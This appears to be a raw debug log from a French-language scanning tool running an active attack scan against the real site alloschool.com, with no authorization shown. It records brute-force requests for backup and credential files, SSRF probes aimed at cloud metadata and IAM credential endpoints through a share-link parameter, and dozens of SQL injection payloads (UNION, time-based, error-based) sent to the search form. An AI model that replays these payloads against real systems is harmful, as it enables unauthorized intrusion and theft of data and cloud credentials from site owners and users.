2025-09-22 17:56:14 | [32mINFO[0m | cybersec_tool.sql_scanner | [32m🔍 Début du scan d'injection SQL[0m
2026-01-17 22:17:51 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/authentication.db -> 404[0m
2026-01-17 22:17:51 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/authentication.log -> 404[0m
2026-01-17 22:17:51 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/authentication.ini -> 404[0m
2026-01-17 22:17:51 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/authentication.sql -> 404[0m
2026-01-17 22:17:51 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/authentication.config -> 404[0m
2026-01-17 22:17:51 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/authentication.md -> 404[0m
2026-01-17 22:17:51 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/authentication.xml -> 404[0m
2026-01-17 22:17:51 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/authentication.txt -> 404[0m
2026-01-17 22:17:51 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.config -> 404[0m
2026-01-17 22:17:51 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.old -> 404[0m
2026-01-17 22:17:51 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.xml -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.ini -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.conf -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.bak -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.orig -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.tmp -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.backup -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.bak -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.backup -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.txt -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.db -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.md -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.log -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.old -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.sql -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backup.sqlite -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.sqlite -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.conf -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.xml -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.orig -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.ini -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.config -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.tmp -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.db -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.sql -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.txt -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.conf -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.old -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.md -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/backups.log -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.tmp -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.orig -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.bak -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.backup -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.ini -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.xml -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.txt -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.db -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.md -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.log -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.config -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.sqlite -> 404[0m
2026-01-17 22:17:52 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/bak.sql -> 404[0m
2026-01-17 22:17:56 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/secret -> 404[0m
2026-01-17 22:17:56 | [32mINFO[0m | cybersec_tool.directory_buster | [32m✅ Découverte terminée en 16.78s - 8 éléments trouvés[0m
2026-01-17 22:18:06 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/section/4641 -> 200[0m
2026-01-17 22:18:06 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/section/4641 -> 200[0m
2026-01-17 22:18:07 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=%2F%2Fexample.com&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 301[0m
2026-01-17 22:18:07 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/section/4641 -> 200[0m
2026-01-17 22:18:18 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/section/4641 -> 200[0m
2026-01-17 22:18:18 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/section/4641 -> 200[0m
2026-01-17 22:18:19 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2F127.0.0.1%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:19 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2F127.0.0.1%3A80%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:20 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2Flocalhost%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:20 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2Flocalhost%3A80%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:21 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2F0.0.0.0%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:21 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2F%5B%3A%3A1%5D%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:22 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:22 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2Fexample.com%2Fcallback&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:23 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=https%3A%2F%2Fhttpbin.org%2Fget&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:23 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=https%3A%2F%2Fpostman-echo.com%2Fget&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:24 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2F127.0.0.1%3A8080%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:24 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2Flocalhost%3A8080%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:25 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2F127.0.0.1%3A8000%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:25 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=https%3A%2F%2Fhttpbin.org%2Fanything&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:26 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2F169.254.169.254%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:26 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2Fmetadata.google.internal%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:27 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:27 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2Finstance%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:28 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2F169.254.169.254%2Fmetadata%2Finstance%3Fapi-version%3D2021-02-01&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:28 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://twitter.com/share?url=http%3A%2F%2Fmetadata%2FcomputeMetadata%2Fv1%2F&text=Les+ensembles+de+nombres+N%2C+Z%2C+Q%2C+D+et+R&via=allo_school -> 200[0m
2026-01-17 22:18:38 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/section/4641 -> 200[0m
2026-01-17 22:18:49 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/section/4641 -> 200[0m
2026-01-17 22:18:49 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/section/4641 -> 200[0m
2026-01-17 22:18:59 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/section/4641 -> 200[0m
2026-01-17 22:18:59 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/section/4641 -> 200[0m
2026-01-17 22:19:00 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/section/4641 -> 200[0m
2026-01-17 22:24:05 | [32mINFO[0m | cybersec_tool.sql_scanner | [32m🔍 Début du scan d'injection SQL[0m
2026-01-17 22:24:15 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/section/4641 -> 200[0m
2026-01-17 22:24:16 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/section/4641 -> 200[0m
2026-01-17 22:24:16 | [32mINFO[0m | cybersec_tool.sql_scanner | [32m📊 Trouvé 0 paramètres GET et 1 formulaires[0m
2026-01-17 22:24:16 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+OR+1%3D1-- -> 200[0m
2026-01-17 22:24:17 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+OR+1%3D1%23 -> 200[0m
2026-01-17 22:24:17 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+OR+%27a%27%3D%27a -> 200[0m
2026-01-17 22:24:18 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+OR+%271%27%3D%271%27+--+- -> 200[0m
2026-01-17 22:24:18 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=admin%27-- -> 200[0m
2026-01-17 22:24:19 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27%29%29+OR+%271%27%3D%271%27+--+- -> 200[0m
2026-01-17 22:24:19 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27%29+OR+%28%271%27%3D%271 -> 200[0m
2026-01-17 22:24:20 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%22+OR+%221%22%3D%221%22+--+ -> 200[0m
2026-01-17 22:24:20 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27%29+OR+1%3D1+--+ -> 200[0m
2026-01-17 22:24:21 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=1+OR+1%3D1 -> 200[0m
2026-01-17 22:24:21 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=1%27+OR+%271%27%3D%271%27+--+ -> 200[0m
2026-01-17 22:24:22 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+UNION+SELECT+NULL-- -> 200[0m
2026-01-17 22:24:22 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+UNION+SELECT+NULL%2CNULL-- -> 200[0m
2026-01-17 22:24:23 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+OR+SLEEP%281%29-- -> 200[0m
2026-01-17 22:24:23 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27%3BWAITFOR+DELAY+%270%3A0%3A1%27-- -> 200[0m
2026-01-17 22:24:24 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+AND+%271%27%3D%271%27+--+ -> 200[0m
2026-01-17 22:24:24 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+AND+%271%27%3E%270%27+--+ -> 200[0m
2026-01-17 22:24:25 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27%29+AND+%281%3D1%29+--+ -> 200[0m
2026-01-17 22:24:25 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=0+OR+1%3D1 -> 200[0m
2026-01-17 22:24:26 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=0%29+OR+1%3D1+--+ -> 200[0m
2026-01-17 22:24:26 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+OR+1%3D1%2F%2A -> 200[0m
2026-01-17 22:24:27 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27%29+OR+1%3D1%2F%2A -> 200[0m
2026-01-17 22:24:27 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+UNION+SELECT+1%2C2-- -> 200[0m
2026-01-17 22:24:28 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+OR+%271%27%3D%271%27+%2F%2A -> 200[0m
2026-01-17 22:24:28 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+OR+1%3D1+LIMIT+1+-- -> 200[0m
2026-01-17 22:24:29 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27%29+OR+1%3D1+--+- -> 200[0m
2026-01-17 22:24:29 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=1+OR+1%3D1+--+- -> 200[0m
2026-01-17 22:24:30 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+OR+SLEEP%283%29-- -> 200[0m
2026-01-17 22:24:30 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=1%3B+SELECT+version%28%29%3B+-- -> 200[0m
2026-01-17 22:24:31 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+UNION+SELECT+NULL%2CNULL%2CNULL-- -> 200[0m
2026-01-17 22:24:31 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+AND+SLEEP%283%29--+ -> 200[0m
2026-01-17 22:24:32 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+UNION+SELECT+%40%40version--+ -> 200[0m
2026-01-17 22:24:32 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+UNION+SELECT+database%28%29--+ -> 200[0m
2026-01-17 22:24:33 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+UNION+SELECT+user%28%29--+ -> 200[0m
2026-01-17 22:24:33 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%27+AND+extractvalue%281%2C+concat%280x7e%2Cversion%28%29%29%29--+ -> 200[0m
2026-01-17 22:24:34 | [36mDEBUG[0m | cybersec_tool.http_client | [36mGET https://www.alloschool.com/search?q=%22+AND+updatexml%281%2C+concat%280x7e%2C+user%28%29%29%2C+1%29--+ -> 200[0m
